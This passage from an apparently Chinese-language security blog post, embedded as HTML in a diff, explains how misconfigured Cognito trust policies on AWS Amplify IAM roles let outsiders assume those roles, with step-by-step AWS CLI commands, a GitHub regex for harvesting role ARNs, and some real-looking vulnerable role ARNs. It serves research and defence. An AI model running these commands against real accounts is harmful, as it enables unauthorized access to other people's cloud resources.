+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549693.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549693.png-water_print" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549624.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549624.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549624.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549624.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549624.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549624.png-water_print" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549436.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549436.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549436.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549436.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549436.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549436.png-water_print" /></p>
+<p>现在，攻击者可以调用 API 来查看 EventPlanners 数据库的全部内容：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549976.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549976.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549976.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549976.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549976.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549976.png-water_print" /></p>
+<p>总结一下，攻击流程如图：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549493.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549493.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549493.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549493.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549493.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549493.png-water_print" /></p>
+<h2 id="2-aws-amplify漏洞">2. AWS Amplify漏洞</h2>
+<h3 id="21-背景">2.1. 背景</h3>
+<blockquote>
+<p>AWS Cognito是一项AWS服务，用于管理用户身份验证和授权，以便开发人员可以轻松地添加用户注册、登录和访问控制功能到他们的应用程序中。Amazon Cognito是以开发人员为中心且经济高效的客户身份和访问管理（CIAM）服务，它提供了可将用户规模扩展到数以百万计的安全身份存储和联合身份验证选项。</p>
+</blockquote>
+<p>Cognito 的主要功能之一是身份池，它允许开发人员授权认证用户或匿名用户访问 AWS 资源。身份池可以为这些用户发放标准的短期STS凭证（访问密钥）。</p>
+<p>为此，Cognito 在 AWS 账户中创建了一个角色，该角色的信任策略类似于以下内容：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;Version&#34;</span><span class="p">:</span> <span class="s2">&#34;2012-10-17&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;Statement&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Effect&#34;</span><span class="p">:</span> <span class="s2">&#34;Allow&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Principal&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;Federated&#34;</span><span class="p">:</span> <span class="s2">&#34;cognito-identity.amazonaws.com&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Action&#34;</span><span class="p">:</span> <span class="s2">&#34;sts:AssumeRoleWithWebIdentity&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Condition&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;StringEquals&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;cognito-identity.amazonaws.com:aud&#34;</span><span class="p">:</span> <span class="s2">&#34;us-east-1:00000000-aaaa-1111-bbbb-222222222222&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">},</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;ForAnyValue:StringLike&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;cognito-identity.amazonaws.com:amr&#34;</span><span class="p">:</span> <span class="s2">&#34;authenticated&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>该策略最重要的部分是<code>Condition</code>元素。如果没有这个条件，cognito-identity.amazonaws.com服务的信任关系就会允许任何人担任这个角色，这一点我们将在下面的章节中加以说明。</p>
+<h3 id="22-潜在误配置1trust-policy-without-a-condition">2.2. 潜在误配置1：Trust policy without a condition</h3>
+<p>潜在误配置1：不带条件的信任策略</p>
+<p>要模拟(assume)配置了错误角色信任策略的IAM角色，首先必须能够配置Cognito服务代表攻击者模拟(assume)另一个角色，在大多数情况下，这是不可能的。举个例子，如果用户创建了一个身份池或修改了一个现有身份池，并试图在不同账户中指定一个未经身份验证的角色，你会收到以下错误信息：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">local@host % aws cognito-identity set-identity-pool-roles <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>--identity-pool-id us-east-1:11111111-aaaa-2222-bbbb-333333333333 <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>--roles <span class="nv">unauthenticated</span><span class="o">=</span>arn:aws:iam::222222222222:role/role-in-different-aws-account
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">An error occurred <span class="o">(</span>AccessDeniedException<span class="o">)</span> when calling the SetIdentityPoolRoles operation: Cross-account pass role is not allowed.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是，研究人员发现了一种方法，可以使用Cognito 的基本（经典）验证流程，在信任策略配置错误的情况下模拟其它角色。sts:AssumeRoleWithWebIdentity将IAM角色的ARN作为参数，允许用户在不同的AWS账户中指定易受攻击的角色。重要的是，指定属于不同 AWS 账户的角色不会返回错误。</p>
+<p>假设攻击者能够通过在自己的账户中创建身份池，在角色信任策略配置错误的情况下模拟 IAM 角色。然后，攻击者会使用自己的身份池生成sts:AssumeRoleWithWebIdentity API 调用所需的身份令牌，并提供受害者账户中角色的 ARN。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301550226.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301550226.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301550226.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301550226.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301550226.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301550226.png-water_print" /></p>
+<p>举个例子：假如用户在一个ARN 为arn:aws:iam::111111111111:role/vulnerable_role的角色上配置了错误的角色信任策略：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;Version&#34;</span><span class="p">:</span> <span class="s2">&#34;2012-10-17&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;Statement&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Effect&#34;</span><span class="p">:</span> <span class="s2">&#34;Allow&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Principal&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;Federated&#34;</span><span class="p">:</span> <span class="s2">&#34;cognito-identity.amazonaws.com&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Action&#34;</span><span class="p">:</span> <span class="s2">&#34;sts:AssumeRoleWithWebIdentity&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>上述配置没有设置condition元素 ，这种情况会导致任何 Cognito 身份池中的用户都可以模拟该角色，包括该当前AWS账户之外的用户，且无需进一步的身份验证或授权。攻击者可以通过自己控制的恶意账户执行以下步骤来模拟角色：</p>
+<p>1、创建攻击者控制的 Cognito 身份池。</p>
+<ul>
+<li><code>aws cognito-identity create-identity-pool --identity-pool-name attacker_id_pool --allow-classic-flow --allow-unauthenticated-identities</code></li>
+<li>执行命令后会返回IdentityPoolId</li>
+</ul>
+<p>2、使用上一步的IdentityPoolId生成Cognito IdentityId。</p>
+<ul>
+<li><code>aws cognito-identity get-id --identity-pool-id IdentityPoolId</code></li>
+<li>执行命令后会返回IdentityId。</li>
+</ul>
+<p>3、生成 Cognito 网络身份令牌</p>
+<ul>
+<li><code>aws cognito-identity get-open-id-token --identity-id IdentityId</code></li>
+<li>执行命令后会返回令牌。</li>
+</ul>
+<p>4、使用sts:AssumeRoleWithWebIdentity 模拟受害者账户中的角色。</p>
+<ul>
+<li><code>aws sts assume-role-with-web-identity --role-arn arn:aws:iam::111111111111:role/vulnerable_role --role-session-name hacked --web-identity-token token</code></li>
+<li>为受害者账户中的易受攻击角色生成STS临时凭据，从而控制该角色下的资源</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">local@host % aws sts get-caller-identity
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">    &#34;UserId&#34;: &#34;AROAEXAMPLEEXAMPLE123:hacked&#34;,
+</span></span><span class="line"><span class="cl">    &#34;Account&#34;: &#34;111111111111&#34;,
+</span></span><span class="line"><span class="cl">    &#34;Arn&#34;: &#34;arn:aws:sts::111111111111:assumed-role/vulnerable_role/hacked&#34;
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="23-潜在误配置2trust-policy-with-an-unauthenticated-condition">2.3. 潜在误配置2：Trust policy with an unauthenticated condition</h3>
+<p>需要注意的是，当Condition元素为空或 <code>cognito-identity.amazonaws.com:amr</code> 条件设置为<code>unauthenticated</code>时，和上面的问题具有同样的效果，不再赘述。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;Version&#34;</span><span class="p">:</span> <span class="s2">&#34;2012-10-17&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;Statement&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Effect&#34;</span><span class="p">:</span> <span class="s2">&#34;Allow&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Principal&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;Federated&#34;</span><span class="p">:</span> <span class="s2">&#34;cognito-identity.amazonaws.com&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Action&#34;</span><span class="p">:</span> <span class="s2">&#34;sts:AssumeRoleWithWebIdentity&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Condition&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;ForAnyValue:StringLike&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;cognito-identity.amazonaws.com:amr&#34;</span><span class="p">:</span> <span class="s2">&#34;unauthenticated&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="24-潜在误配置3trust-policy-with-an-authenticated-condition">2.4. 潜在误配置3：Trust policy with an authenticated condition</h3>
+<p>假设某个角色配置了需要经过验证的<code>cognito-identity.amazonaws.com:amr</code>条件，仍然可以绕过限制。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;Version&#34;</span><span class="p">:</span> <span class="s2">&#34;2012-10-17&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;Statement&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Effect&#34;</span><span class="p">:</span> <span class="s2">&#34;Allow&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Principal&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;Federated&#34;</span><span class="p">:</span> <span class="s2">&#34;cognito-identity.amazonaws.com&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Action&#34;</span><span class="p">:</span> <span class="s2">&#34;sts:AssumeRoleWithWebIdentity&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Condition&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;ForAnyValue:StringLike&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;cognito-identity.amazonaws.com:amr&#34;</span><span class="p">:</span> <span class="s2">&#34;authenticated&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>1、验证攻击者控制的用户池：</p>
+<ul>
+<li><code>aws cognito-idp initiate-auth --auth-flow USER_PASSWORD_AUTH --client-id &lt;attacker controlled client id&gt; --auth-parameters USERNAME=&lt;username&gt;,PASSWORD=&lt;password&gt;</code></li>
+<li>返回IdToken。</li>
+</ul>
+<p>2、生成一个 Cognito IdentityId：</p>
+<ul>
+<li><code>aws cognito-identity get-id --identity-pool-id &lt;attacker controlled identity pool id&gt; --logins '{&quot;cognito-idp.us-east-1.amazonaws.com/&lt;attacker controlled identity pool id&gt;&quot;:&quot;&lt;IdToken from step 1&gt;&quot;}'</code></li>
+<li>返回IdentityId。</li>
+</ul>
+<p>3、生成 Cognito 网络身份令牌：</p>
+<ul>
+<li><code>aws cognito-identity get-open-id-token --identity-id &lt;identityId from step 2&gt; --logins '{&quot;cognito-idp.us-east-1.amazonaws.com/&lt;attacker controlled user pool id&gt;&quot;:&quot;&lt;IdToken from step 1&gt;&quot;}'</code></li>
+<li>返回令牌。</li>
+</ul>
+<p>4、使用sts:AssumeRoleWithWebIdentity模拟受害者账户中的角色。</p>
+<ul>
+<li><code>aws sts assume-role-with-web-identity --role-arn arn:aws:iam::111111111111:role/vulnerable_role --role-session-name hacked --web-identity-token token</code></li>
+</ul>
+<h3 id="25-如何寻找存在风险的角色">2.5. 如何寻找存在风险的角色</h3>
+<p>在前面的章节中介绍了影响Amazon Cognito使用的IAM角色的不同类型的错误配置，这些并不是Amazon Cognito中的漏洞，只是错误配置带来的风险。通过使用公开数据进行搜索，研究员发现错误配置在野的一些情况：</p>
+<p>要模拟受害者易受攻击的角色，需要该角色的ARN，有一些方法可以实现，如：</p>
+<ul>
+<li>爆破已知账户 ID的 IAM角色</li>
+<li>通过唯一标识符枚举ARN</li>
+<li>利用搜索引擎搜索公开的 ARN</li>
+<li>通过正则表达式搜索GitHub代码仓中的ARN</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">/arn:aws:iam::[0-9]{12}:role\/[\/a-zA-Z0-9-_]+/ count:all archived:yes fork:yes context:global
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>为了测试收集到的 IAM角色是否存在漏洞，可以尝试使用前面的方法进行验证。研究员在测试过程中发现，超过90%的存在风险的角色具有相似的名称：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">communicationclient-master-20190713239617-authRole
+</span></span><span class="line"><span class="cl">chatamber-20181621961321-authRole
+</span></span><span class="line"><span class="cl">ml-yeti-ui-dev-20191316145242-unauthRole
+</span></span><span class="line"><span class="cl">aerodeploy-master-132847-authRole
+</span></span><span class="line"><span class="cl">liveconveyance-dev-175294-unauthRole
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这些角色几乎都是以authRole或unauthRole 结尾。此外，一些角色名称包含2018年的时间戳，而其他角色（可能是最近的角色）则包含六位整数，以保持命名唯一性。</p>
+<p>在收集过程中发现了另外一个有趣结果，一些存在风险的角色属于AWS本身。在AWS Samples GitHub组织中发现了三个这样的角色：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">arn:aws:iam::929881370398:role/amplify-awsassistant-sampledev-144248-authRole
+</span></span><span class="line"><span class="cl">arn:aws:iam::098305555551:role/amplify-livetranslation-dev-165918-unauthRole
+</span></span><span class="line"><span class="cl">arn:aws:iam::098305555551:role/amplify-livetranslation-dev-165918-authRole
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在发现这些官方配置错误的角色后，那么是什么原因导致的呢？</p>
+<p>研究人员开始搜索此类角色的位置，其中很大部分位于名为<code>team-provider-info.json</code>的文件中，这些文件与AWS Amplify服务有关。</p>
+<p>Amplify旨在帮助前端和移动开发者快速构建并部署全栈应用程序，为了探究原因，研究员创建了Amplify项目，Amplify在账户中自动添加了两个IAM角色，名为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">amplify-secrestesting-dev-134733-authRole
+</span></span><span class="line"><span class="cl">amplify-secrestesting-dev-134733-unauthRole
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>现在，可以确定这些角色来自Amplify，但它们是如何配置错误的呢？</p>
+<h4 id="251-方式一">2.5.1. 方式一</h4>
+<p>默认情况下，当 Amplify 在账户中创建这些授权和未授权角色时，它们的角色信任策略如下所示：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;Version&#34;</span><span class="p">:</span> <span class="s2">&#34;2012-10-17&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;Statement&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Sid&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Effect&#34;</span><span class="p">:</span> <span class="s2">&#34;Deny&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Principal&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;Federated&#34;</span><span class="p">:</span> <span class="s2">&#34;cognito-identity.amazonaws.com&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Action&#34;</span><span class="p">:</span> <span class="s2">&#34;sts:AssumeRoleWithWebIdentity&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个配置与前面提到过存在风险的配置类似，但是<code>Effect</code>字段被设置为<code>Deny</code>，这样就可以阻止其它用户模拟该角色，因此是安全的。</p>
+<p>作为Amplify服务的一部分，用户可以在应用程序中添加身份验证组件，允许开发者添加用户注册和登录等功能。在后台Amplify将自动部署和配置 Amazon Cognito服务，该身份验证组件将使用前面为Amplify项目创建的 auth 和 unauth 角色。auth角色用于已通过 Amplify 应用程序身份验证的用户，而unauth角色用于未通过身份验证的用户。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301550135.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301550135.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301550135.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301550135.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301550135.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301550135.png-water_print" /></p>
+<p>出现这种情况时，Amplify会将auth 和 unauth 角色的信任策略配置为类似下面的内容：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;Version&#34;</span><span class="p">:</span> <span class="s2">&#34;2012-10-17&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;Statement&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Effect&#34;</span><span class="p">:</span> <span class="s2">&#34;Allow&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Principal&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;Federated&#34;</span><span class="p">:</span> <span class="s2">&#34;cognito-identity.amazonaws.com&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">},</span>
